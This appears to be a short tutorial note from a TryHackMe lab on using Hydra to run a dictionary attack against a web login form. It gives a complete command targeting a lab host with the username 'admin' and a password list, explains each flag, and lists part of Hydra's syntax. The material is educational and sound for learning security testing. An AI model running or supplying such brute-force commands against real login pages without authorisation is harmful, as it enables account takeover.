Hydra, a password‑testing tool that automates login attempts against a target application using a wordlist. if we know the username of the target, Hydra will systematically try each password in the wordlist to see if the login is successful. This technique is known as a dictionary attack, as the tool relies on a predefined list of possible passwords.


Command line - hydra -l admin -P passlist.txt www.onlineshop.thm http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V

Breakdown - 

hydra The command-line tool used to perform the dictionary attack
-l admin Attempts to log in using the username admin
-P passlist.txt Specifies the password list to try
www.onlineshop.thm Sets the target website
http-post-form Indicates that this is an HTTP POST request form
"/login:username=^USER^&password=^PASS^:F=incorrect" Specifies how the login request is sent and how Hydra determines whether a login attempt has failed
-V Enables verbose output, which displays each username and password attempted

please note the URL we used was of tryhackme and it was a virtual lab it was not a real hack and it's for educational purpose only. **THE URL is not real**. 

Syntax: hydra 
[-l LOGIN]
[-L FILE] 
[-p PASS|
[-P FILE]
[-C FILE]
[-e nsr] 
[-o FILE] 
[-t TASKS] 
[-M FILE ]
[-T TASKS]
[-w TIME] 
[-W TIME] 
[-f] 
[-s PORT] 
[-x MIN:MAX:CHARSET] 
[-c TIME] 
[-ISOuvVd46] 
[-m MODULE_OPT] 
[service://server[:PORT][/OPT]]

Options:
-l LOGIN or -L FILE login with LOGIN name, or load several logins from FILE
-p PASS or -P FILE try password PASS, or load several passwords from FILE
Example: hydra -l admin -P passlist.txt www.onlineshop.thm http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V
